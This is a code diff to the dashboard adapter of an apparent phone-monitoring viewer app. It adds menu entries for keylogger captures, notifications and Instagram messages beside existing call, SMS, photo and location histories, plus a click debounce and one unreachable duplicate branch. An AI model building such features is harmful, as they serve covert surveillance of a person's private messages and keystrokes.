@@ -33,8 +33,10 @@ import com.scp.viewer.View.CallHistory;
 import com.scp.viewer.View.ClipboardHistory;
 import com.scp.viewer.View.ContactHistory;
 import com.scp.viewer.View.HistoryLocation;
+import com.scp.viewer.View.KeyloggerHistory;
 import com.scp.viewer.View.NetworkHistory;
 import com.scp.viewer.View.NotesHistory;
+import com.scp.viewer.View.NotificationHistory;
 import com.scp.viewer.View.PhoneCallRecordHistory;
 import com.scp.viewer.View.PhotoHistory;
 import com.scp.viewer.View.SMSHistory;
@@ -50,6 +52,7 @@ import static com.scp.viewer.API.Global.SMS_BBM_TYPE;
 import static com.scp.viewer.API.Global.SMS_DEFAULT_TYPE;
 import static com.scp.viewer.API.Global.SMS_FACEBOOK_TYPE;
 import static com.scp.viewer.API.Global.SMS_HANGOUTS_TYPE;
+import static com.scp.viewer.API.Global.SMS_INSTAGRAM_TYPE;
 import static com.scp.viewer.API.Global.SMS_KIK_TYPE;
 import static com.scp.viewer.API.Global.SMS_LINE_TYPE;
 import static com.scp.viewer.API.Global.SMS_SKYPE_TYPE;
@@ -57,10 +60,12 @@ import static com.scp.viewer.API.Global.SMS_VIBER_TYPE;
 import static com.scp.viewer.API.Global.SMS_WHATSAPP_TYPE;
 import static com.scp.viewer.Database.Entity.CalendarEntity.TABLE_CALENDAR_HISTORY;
 import static com.scp.viewer.Database.Entity.ClipboardEntity.TABLE_CLIPBOARD_HISTORY;
+import static com.scp.viewer.Database.Entity.KeyloggerEntity.TABLE_KEYLOGGER_HISTORY;
 import static com.scp.viewer.Database.Entity.LastTimeGetUpdateEntity.COLUMN_LAST_BBM;
 import static com.scp.viewer.Database.Entity.LastTimeGetUpdateEntity.COLUMN_LAST_CLIPBOARD;
 import static com.scp.viewer.Database.Entity.LastTimeGetUpdateEntity.COLUMN_LAST_FACEBOOK;
 import static com.scp.viewer.Database.Entity.LastTimeGetUpdateEntity.COLUMN_LAST_HANGOUTS;
+import static com.scp.viewer.Database.Entity.LastTimeGetUpdateEntity.COLUMN_LAST_INSTAGRAM;
 import static com.scp.viewer.Database.Entity.LastTimeGetUpdateEntity.COLUMN_LAST_KIK;
 import static com.scp.viewer.Database.Entity.LastTimeGetUpdateEntity.COLUMN_LAST_LINE;
 import static com.scp.viewer.Database.Entity.LastTimeGetUpdateEntity.COLUMN_LAST_SKYPE;
@@ -68,9 +73,11 @@ import static com.scp.viewer.Database.Entity.LastTimeGetUpdateEntity.COLUMN_LAST
 import static com.scp.viewer.Database.Entity.LastTimeGetUpdateEntity.COLUMN_LAST_VIBER;
 import static com.scp.viewer.Database.Entity.LastTimeGetUpdateEntity.COLUMN_LAST_WHATSAPP;
 import static com.scp.viewer.Database.Entity.NetworkEntity.TABLE_NETWORK_HISTORY;
+import static com.scp.viewer.Database.Entity.NotificationEntity.TABLE_NOTIFICATION_HISTORY;
 import static com.scp.viewer.Database.Entity.SMSEntity.TABLE_GET_BBM;
 import static com.scp.viewer.Database.Entity.SMSEntity.TABLE_GET_FACEBOOK;
 import static com.scp.viewer.Database.Entity.SMSEntity.TABLE_GET_HANGOUTS;
+import static com.scp.viewer.Database.Entity.SMSEntity.TABLE_GET_INSTAGRAM;
 import static com.scp.viewer.Database.Entity.SMSEntity.TABLE_GET_KIK;
 import static com.scp.viewer.Database.Entity.SMSEntity.TABLE_GET_LINE;
 import static com.scp.viewer.Database.Entity.SMSEntity.TABLE_GET_SKYPE;
@@ -83,6 +90,8 @@ public class AdapterFeatureDashboard extends RecyclerView.Adapter<AdapterFeature
     private ArrayList<Feature> featureList;
     private Activity context;
     private Table table;
+    private long mLastClickTime = System.currentTimeMillis();
+    private static final long CLICK_TIME_INTERVAL = 300;
 
     //  constructor three parameters
     public AdapterFeatureDashboard(ArrayList<Feature> featureList, Activity context, Table table) {
@@ -135,6 +144,7 @@ public class AdapterFeatureDashboard extends RecyclerView.Adapter<AdapterFeature
         LinearLayout ln_Feature;
         View mView;
 
+
         public ViewHolder(View itemView) {
             super(itemView);
             mView = itemView;
@@ -150,6 +160,11 @@ public class AdapterFeatureDashboard extends RecyclerView.Adapter<AdapterFeature
         @Override
         public void onClick(View v) {
             int position = getAdapterPosition();
+            long now = System.currentTimeMillis();
+            if (now - mLastClickTime < CLICK_TIME_INTERVAL) {
+                return;
+            }
+            mLastClickTime = now;
             if (position != RecyclerView.NO_POSITION)
             {
                 if(!featureList.get(position).getFeatureName().isEmpty())
@@ -189,6 +204,10 @@ public class AdapterFeatureDashboard extends RecyclerView.Adapter<AdapterFeature
                     else if(featureList.get(position).getFeatureName().equals(context.getResources().getString(R.string.WHATSAPP_HISTORY)))
                     {
                         setIntentForMessage(context,table, TABLE_GET_WHATSAPP,COLUMN_LAST_WHATSAPP, getSMSType(featureList.get(position).getFeatureName(),context));
+                    }
+                    else if(featureList.get(position).getFeatureName().equals(context.getResources().getString(R.string.INSTAGRAM_HISTORY))) // 2021-07-23
+                    {
+                        setIntentForMessage(context,table, TABLE_GET_INSTAGRAM, COLUMN_LAST_INSTAGRAM, getSMSType(featureList.get(position).getFeatureName(),context));
                     }
                     else if(featureList.get(position).getFeatureName().equals(context.getResources().getString(R.string.APPLICATION_USAGE)))
                     {
@@ -246,7 +265,18 @@ public class AdapterFeatureDashboard extends RecyclerView.Adapter<AdapterFeature
                     {
                         setIntentDefault(context,table, TABLE_YOUTUBE_HISTORY, YouTubeHistory.class);
                     }
-
+                    else if(featureList.get(position).getFeatureName().equals(context.getResources().getString(R.string.NOTIFICATION_HISTORY)))
+                    {
+                        setIntentDefault(context,table, TABLE_NOTIFICATION_HISTORY, NotificationHistory.class);
+                    }
+                    else if(featureList.get(position).getFeatureName().equals(context.getResources().getString(R.string.KEYLOGGER_HISTORY)))
+                    {
+                        setIntentDefault(context,table, TABLE_KEYLOGGER_HISTORY, KeyloggerHistory.class);
+                    }
+                    else if(featureList.get(position).getFeatureName().equals(context.getResources().getString(R.string.INSTAGRAM_HISTORY)))
+                    {
+                        setIntentForMessage(context, table, TABLE_GET_INSTAGRAM, COLUMN_LAST_INSTAGRAM, getSMSType(featureList.get(position).getFeatureName(), context));
+                    }
                 }
             }
         }
@@ -294,6 +324,10 @@ public class AdapterFeatureDashboard extends RecyclerView.Adapter<AdapterFeature
         {
             return SMS_KIK_TYPE;
         }
+       else if(nameFeature.equals(context.getResources().getString(R.string.INSTAGRAM_HISTORY)))
+       {
+           return SMS_INSTAGRAM_TYPE;
+       }
         else {
            return SMS_DEFAULT_TYPE;
        }
